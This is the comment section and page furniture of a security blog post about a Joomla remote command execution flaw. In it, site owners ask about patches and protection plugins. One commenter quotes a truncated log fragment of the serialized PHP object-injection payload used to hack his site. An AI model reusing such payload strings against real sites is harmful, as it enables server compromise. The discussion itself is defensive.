			<p class="comment-meta"><time class="comment-time" datetime="2016-01-03T22:37:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7205">January 3, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I posted two links on the Joomla forum to reports on the Zero day. (My host had provided them after my site was hacked)  The security moderators deleted the links under the premise of </p>
<p>&#8220;removed  links expaining how to hack sites.&#8221;</p>
<p>Is there something I&#8217;m misunderstanding and does this page  explain how to hack sites.</p>
		</div>

		
		
	</article>
	<ul class="children">

	<li class="comment odd alt depth-2" id="comment-7220">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6ee9e067e8f436dce02e3c433d793d83?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Toby Salmon</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-01-08T22:02:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7220">January 8, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Anybody have any thoughts on this?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ul><!-- .children -->
</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7240">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/b0ba356b0377a1f4e4331efa2b42a944?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/b0ba356b0377a1f4e4331efa2b42a944?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Khoa</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-01-20T02:06:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7240">January 20, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>I installed oseSecure on my site several months ago, would this protect me? It scans and blocks sql injections, file uploading and code etc.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7337">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/6d04e0ba9e1f6697f0d662bf5873e551?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/6d04e0ba9e1f6697f0d662bf5873e551?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name"><a href="http://secupent.com/" class="comment-author-link" rel="external nofollow" itemprop="url">Shahidul</a></span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-02-15T07:07:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7337">February 15, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Thanks for sharing. Useful.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7362">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Philipp Lang</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-02-22T12:57:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7362">February 22, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My site was hacked yesterday &#8211; my log: </p>
<p>&#8230; __test|O:21:&#8221;JDatabaseDriverMysqli&#8221;:3:{s:2:&#8221;fc&#8221;;O:17:&#8221;JSimplepieFactory&#8221;:0 &#8230;</p>
<p>I use Joomla 3.4.8, so the bug should have been fixed a few months ago. What&#8217;s wrong here?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment odd alt thread-odd thread-alt depth-1" id="comment-7363">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/731cbd9ec91cdfa8edeac834b64a3a48?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Philipp Lang</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-02-22T13:25:00-08:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7363">February 22, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>My site was hacked yesterday, although I  have the latest Joomla version. What&#8217;s going on here?</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->

	<li class="comment even thread-even depth-1" id="comment-7844">
	<article >

		
		<header class="comment-header">
			<p class="comment-author">
				<img alt='' src='https://secure.gravatar.com/avatar/5e2f6ead07984e5e1e826bd2ed162df2?s=48&#038;d=mm&#038;r=g' srcset='https://secure.gravatar.com/avatar/5e2f6ead07984e5e1e826bd2ed162df2?s=96&#038;d=mm&#038;r=g 2x' class='avatar avatar-48 photo' height='48' width='48' loading='lazy'/><span itemprop="name">Gustavo Jaramillo</span> 			</p>

			<p class="comment-meta"><time class="comment-time" datetime="2016-08-25T10:19:00-07:00" itemprop="datePublished"><a href="https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html#comment-7844">August 25, 2016</a></time></p>		</header>

		<div class="comment-content">
			
			<p>Very good thread. @dcid:disqus I have my site with Joomla 1.5 and we built a software in it. Therefore, we cannot upgrade to the new version because the software won&#8217;t work. How can I fix the vulnerability issues (possibly the hotfix) so we can have time to update the software and use it with another CMS. </p>
<p>Please advice. Thank you very much.</p>
		</div>

		
		
	</article>
	</li><!-- #comment-## -->
</ol></div></main><aside class="sidebar sidebar-primary widget-area" role="complementary" aria-label="Primary Sidebar" itemscope itemtype="https://schema.org/WPSideBar" id="genesis-sidebar-primary"><h2 class="genesis-sidebar-title screen-reader-text">Primary Sidebar</h2><div class="sidebar-primary-wrap"><section id="text-5" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Socialize With Sucuri</h3>
			<div class="textwidget"><p>We're actively engaged across multiple platforms. Follow us and let's connect!</p>
<ul class="social-icons">
<li><a target="_blank" href="https://www.facebook.com/SucuriSecurity" rel="noopener"><span class="screen-reader-text">Facebook</span></a></li>
<li><a target="_blank" href="https://twitter.com/sucurisecurity" rel="noopener"><span class="screen-reader-text">Twitter</span></a></li>
<li><a target="_blank" href="https://www.linkedin.com/company/sucuri-security" rel="noopener"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a target="_blank" href="https://www.youtube.com/c/sucurinet" rel="noopener"><span class="screen-reader-text">YouTube</span></a></li>
<li><a target="_blank" href="https://www.instagram.com/sucurisecurity/" rel="noopener"><span class="screen-reader-text">Instagram</span></a></li>
<li><a target="_blank" href="https://blog.sucuri.net/feed/" rel="noopener"><span class="screen-reader-text">RSS Feed</span></a></li>
</ul>
</div>
		</div></section>
<section id="search-3" class="widget widget_search"><div class="widget-wrap"><form class="search-form" method="get" action="https://blog.sucuri.net/"><label class="search-form-label screen-reader-text" for="searchform-62ea523d15df6">Search the blog</label><input type="search" name="s" id="searchform-62ea523d15df6" placeholder="Search the blog" /><input type="submit" value="Search" /></form></div></section>
<section id="text-24" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/how-to-clean-hacked-joomla?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=Hacked-Joomla" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23342 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_joomla-hack.png" alt="Joomla Security Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-27" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/guides/how-to-clean-a-hacked-website?utm_source=Blog&#038;utm_medium=WidgetLogic&#038;utm_campaign=Guide&#038;utm_term=EN&#038;utm_content=Hacked-Website" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23349 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_guides_website-hack.png" alt="How to Clean a Hacked Website Guide" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-31" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><p><a href="https://sucuri.net/webinars/how-to-clean-hacked-joomla-site?utm_source=Blog&amp;utm_medium=WidgetLogic&amp;utm_campaign=Webinar&amp;utm_term=EN&amp;utm_content=Hacked-Joomla" target="_blank" rel="noopener"><img loading="lazy" class="size-full wp-image-23481 aligncenter" src="https://blog.sucuri.net/wp-content/uploads/2019/05/blog-sidebar_widgetlogic_webinars_hacked-joomla.png" alt="" width="250" height="352" /></a></p>
</div>
		</div></section>
<section id="text-37" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"></div>
		</div></section>
</div><div class="sidebar-cta-widget" id="sidebar-cta"><section id="text-6" class="widget widget_text"><div class="widget-wrap"><h3 class="widgettitle widget-title">Join Over 20,000 Subscribers!</h3>
			<div class="textwidget"><p><a href="http://sucuri.hs-sites.com/subscribe-to-security" onClick="ga('send', 'event', 'Blog', 'Button_Click', 'Subscribe_to_Security_Newsletter');"><img src="https://blog.sucuri.net/wp-content/uploads/2017/09/17-EN-sucuri-blog-newsletter-banner.png" /></a></p>
</div>
		</div></section>
</div></aside></div></div></div><footer class="site-footer" itemscope itemtype="https://schema.org/WPFooter"><div class="footer-widgets" id="genesis-footer-widgets"><h2 class="genesis-sidebar-title screen-reader-text">Footer</h2><div class="wrap"><div class="widget-area footer-widgets-1 footer-widget-area"><section id="nav_menu-3" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Products</h3>
<div class="menu-footer-products-menu-container"><ul id="menu-footer-products-menu" class="menu"><li id="menu-item-15501" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15501"><a href="https://sucuri.net/website-firewall/" itemprop="url">Website Firewall</a></li>
<li id="menu-item-15502" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15502"><a href="https://sucuri.net/website-antivirus/" itemprop="url">Website AntiVirus</a></li>
<li id="menu-item-15503" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15503"><a href="https://sucuri.net/website-backups/" itemprop="url">Website Backups</a></li>
<li id="menu-item-15504" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15504"><a href="https://sucuri.net/wordpress-security/" itemprop="url">WordPress Security</a></li>
<li id="menu-item-15505" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15505"><a href="https://sucuri.net/custom/enterprise/" itemprop="url">Enterprise Services</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-2 footer-widget-area"><section id="nav_menu-4" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Solutions</h3>
<div class="menu-footer-solutions-menu-container"><ul id="menu-footer-solutions-menu" class="menu"><li id="menu-item-15506" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15506"><a href="https://sucuri.net/website-firewall/ddos-protection" itemprop="url">DDos Protection</a></li>
<li id="menu-item-15507" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15507"><a href="https://sucuri.net/website-antivirus/malware-scanning-and-detection" itemprop="url">Malware Detection</a></li>
<li id="menu-item-15508" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15508"><a href="https://sucuri.net/website-antivirus/malware-removal" itemprop="url">Malware Removal</a></li>
<li id="menu-item-15510" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15510"><a href="https://sucuri.net/website-firewall/stop-website-attacks-and-hacks" itemprop="url">Malware Prevention</a></li>
<li id="menu-item-15511" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15511"><a href="https://sucuri.net/website-antivirus/blacklist-removal-and-repair" itemprop="url">Blacklist Removal</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-3 footer-widget-area"><section id="nav_menu-6" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Support</h3>
<div class="menu-footer-support-menu-container"><ul id="menu-footer-support-menu" class="menu"><li id="menu-item-15512" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-15512"><a href="https://blog.sucuri.net/" itemprop="url">Blog</a></li>
<li id="menu-item-15513" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15513"><a href="https://kb.sucuri.net/" itemprop="url">Knowledge Base</a></li>
<li id="menu-item-15515" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15515"><a href="https://sitecheck.sucuri.net/" itemprop="url">SiteCheck</a></li>
<li id="menu-item-15516" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15516"><a href="http://labs.sucuri.net/" itemprop="url">Research Labs</a></li>
<li id="menu-item-15517" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15517"><a href="https://sucuri.net/faq/" itemprop="url">FAQ</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-4 footer-widget-area"><section id="nav_menu-5" class="widget widget_nav_menu"><div class="widget-wrap"><h3 class="widgettitle widget-title">Company</h3>
<div class="menu-footer-company-menu-container"><ul id="menu-footer-company-menu" class="menu"><li id="menu-item-15495" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15495"><a href="https://sucuri.net/company/" itemprop="url">About</a></li>
<li id="menu-item-15496" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15496"><a href="https://sucuri.net/company/media" itemprop="url">Media</a></li>
<li id="menu-item-15497" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15497"><a href="https://sucuri.net/company/events" itemprop="url">Events</a></li>
<li id="menu-item-15498" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15498"><a href="https://sucuri.net/company/employment/" itemprop="url">Employment</a></li>
<li id="menu-item-15499" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15499"><a href="https://sucuri.net/company/contact-us" itemprop="url">Contact</a></li>
<li id="menu-item-15500" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-15500"><a href="https://sucuri.net/customers/" itemprop="url">Testimonials</a></li>
</ul></div></div></section>
</div><div class="widget-area footer-widgets-5 footer-widget-area"><section id="text-4" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><ul class="social-icons">
<li><a href="https://www.facebook.com/SucuriSecurity"><span class="screen-reader-text">Facebook</span></a></li>
<li><a href="https://twitter.com/sucurisecurity"><span class="screen-reader-text">Twitter</span></a></li>
<li><a href="https://www.linkedin.com/company/sucuri-security"><span class="screen-reader-text">LinkedIn</span></a></li>
<li><a href="https://www.instagram.com/sucurisecurity/"><span class="screen-reader-text">Instagram</span></a></li>
</ul>
<p><a class="button" href="https://dashboard.sucuri.net/login/">Customer Login</a></p>
<p><a class="footer-logo" href="https://sucuri.net/">Sucuri Home</a></p>
</div>
		</div></section>
</div></div></div><div class="site-footer-widget"><div class="wrap"><section id="text-8" class="widget widget_text"><div class="widget-wrap">			<div class="textwidget"><div class="site-footer-links">
<ul>
<li><a href="https://sucuri.net/terms">Terms of Use</a></li>
<li><a href="https://sucuri.net/privacy">Privacy Policy</a></li>
<li><a href="https://sucuri.net/faq/">Frequently Asked Questions</a></li>
</ul>
</div>
<div class="site-footer-copyright">
<p>&#x000A9;&nbsp;2022 Sucuri Inc. All rights reserved</p>
</div>
</div>
		</div></section>
</div></div></footer></div><script type="text/javascript">
ire('identify', {customerId: '', customerEmail: ''}); </script><div id="cookie-policy-banner" class="container-fluid cookie-policy-banner hide p-0">
        <div class="container">
            <button id="cookie-policy-decline-btn" class="cb-close cb-decline-anchor">X</button>
            <div class="row">
                <div class="c-lg-8">
                    <p class="mb-0 mt-0 highlight green heavy">Sucuri Cookie Policy <br> <a href="https://sucuri.net/cookies" target="_blank" class="bolder no-underline">See our policy>></a></p>
                    <p class="mb-0 mt-0">Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.</p>
                </div>
                <div class="c-lg-4 d-flex justify-items-start mt-15 align-items-center">
                    <button id="cookie-policy-btn" class="btn btn-primary ml-0">Accept</button>
                    <button class="btn cb-decline-anchor auto-track" data-gatrack="Cookie_Click, Decline">Decline</button>
                    <button id="manage-privacy-options" class="btn">Manage Options</button>
                </div>
            </div>
        </div>
    </div><script type="text/javascript">
		/* MonsterInsights Scroll Tracking */
			if ( typeof(jQuery) !== 'undefined' ) {
				jQuery( document ).ready(function(){
					function monsterinsights_scroll_tracking_load() {
						if ( typeof(__gaTracker) !== 'undefined' && __gaTracker && __gaTracker.hasOwnProperty( "loaded" ) && __gaTracker.loaded == true ) {
							(function(factory) {
								factory(jQuery);
							}(function($) {

								/* Scroll Depth */
								"use strict";
								var defaults = {
									percentage: true
								};

								var $window = $(window),
									cache = [],
									scrollEventBound = false,
									lastPixelDepth = 0;

								/*
								 * Plugin
								 */

								$.scrollDepth = function(options) {

									var startTime = +new Date();

									options = $.extend({}, defaults, options);

									/*
									 * Functions
									 */

									function sendEvent(action, label, scrollDistance, timing) {

										var fieldsArray = {
											hitType       : 'event',
											eventCategory : 'Scroll Depth',
											eventAction   : action,
											eventLabel    : label,
											eventValue    : 1,
											nonInteraction: 1
										};

										if ( 'undefined' === typeof MonsterInsightsObject || 'undefined' === typeof MonsterInsightsObject.sendEvent ) {
											return;
										}

										MonsterInsightsObject.sendEvent( fieldsArray );
										if (arguments.length > 3) {
											fieldsArray = {
												hitType        : 'timing',
												timingCategory : 'Scroll Depth',
												timingVar      : action,
												timingValue    : timing,
												timingLabel    : label,
												nonInteraction: 1
											};
											MonsterInsightsObject.sendEvent( fieldsArray );
										}
									}

									function calculateMarks(docHeight) {
										return {
											'25%' : parseInt(docHeight * 0.25, 10),
											'50%' : parseInt(docHeight * 0.50, 10),
											'75%' : parseInt(docHeight * 0.75, 10),
											/* Cushion to trigger 100% event in iOS */
											'100%': docHeight - 5
										};
									}

									function checkMarks(marks, scrollDistance, timing) {
										/* Check each active mark */
										$.each(marks, function(key, val) {
											if ( $.inArray(key, cache) === -1 && scrollDistance >= val ) {
												sendEvent('Percentage', key, scrollDistance, timing);
												cache.push(key);
											}
										});
									}

									function rounded(scrollDistance) {
										/* Returns String */
										return (Math.floor(scrollDistance/250) * 250).toString();
									}

									function init() {
										bindScrollDepth();
									}

									/*
									 * Public Methods
									 */

									/* Reset Scroll Depth with the originally initialized options */
									$.scrollDepth.reset = function() {
										cache = [];
										lastPixelDepth = 0;
										$window.off('scroll.scrollDepth');
										bindScrollDepth();
									};

									/* Add DOM elements to be tracked */
									$.scrollDepth.addElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.merge(options.elements, elems);

										/* If scroll event has been unbound from window, rebind */
										if (!scrollEventBound) {
											bindScrollDepth();
										}

									};

									/* Remove DOM elements currently tracked */
									$.scrollDepth.removeElements = function(elems) {

										if (typeof elems == "undefined" || !$.isArray(elems)) {
											return;
										}

										$.each(elems, function(index, elem) {

											var inElementsArray = $.inArray(elem, options.elements);
											var inCacheArray = $.inArray(elem, cache);

											if (inElementsArray != -1) {
												options.elements.splice(inElementsArray, 1);
											}

											if (inCacheArray != -1) {
												cache.splice(inCacheArray, 1);
											}

										});

									};

									/*
									 * Throttle function borrowed from:
									 * Underscore.js 1.5.2
									 * http://underscorejs.org
									 * (c) 2009-2013 Jeremy Ashkenas, DocumentCloud and Investigative Reporters & Editors
									 * Underscore may be freely distributed under the MIT license.
									 */

									function throttle(func, wait) {
										var context, args, result;
										var timeout = null;
										var previous = 0;
										var later = function() {
											previous = new Date;
											timeout = null;
											result = func.apply(context, args);
										};
										return function() {
											var now = new Date;
											if (!previous) previous = now;
											var remaining = wait - (now - previous);
											context = this;
											args = arguments;
											if (remaining <= 0) {
												clearTimeout(timeout);
												timeout = null;
												previous = now;
												result = func.apply(context, args);
											} else if (!timeout) {
												timeout = setTimeout(later, remaining);
											}
											return result;
										};
									}

									/*
									 * Scroll Event
									 */

									function bindScrollDepth() {

										scrollEventBound = true;

										$window.on('scroll.scrollDepth', throttle(function() {
											/*
											 * We calculate document and window height on each scroll event to
											 * account for dynamic DOM changes.
											 */

											var docHeight = $(document).height(),
												winHeight = window.innerHeight ? window.innerHeight : $window.height(),
												scrollDistance = $window.scrollTop() + winHeight,

												/* Recalculate percentage marks */
												marks = calculateMarks(docHeight),

												/* Timing */
												timing = +new Date - startTime;

											checkMarks(marks, scrollDistance, timing);
										}, 500));

									}

									init();
								};

								/* UMD export */
								return $.scrollDepth;

							}));

							jQuery.scrollDepth();
						} else {
							setTimeout(monsterinsights_scroll_tracking_load, 200);
						}
					}
					monsterinsights_scroll_tracking_load();
				});
			}
		/* End MonsterInsights Scroll Tracking */
		
</script><script type='text/javascript' src='https://blog.sucuri.net/wp-includes/js/hoverIntent.min.js?ver=1.10.2' id='hoverIntent-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.min.js?ver=1.7.5' id='superfish-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/menu/superfish.args.min.js?ver=2.7.1' id='superfish-args-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/genesis/lib/js/skip-links.min.js?ver=2.7.1' id='skip-links-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/theme.js?ver=1.1.0' id='sucuriblog-theme-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky.js?ver=1.0.4' id='sucuriblog-sticky-js-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/sticky-init.js?ver=1.0.1' id='sucuriblog-sticky-js-init-js'></script>
<script type='text/javascript' src='https://blog.sucuri.net/wp-content/themes/sucuriblog0117/js/cookie-banner.js?ver=20200914' id='cookie-banner-js-js'></script>
</body></html>
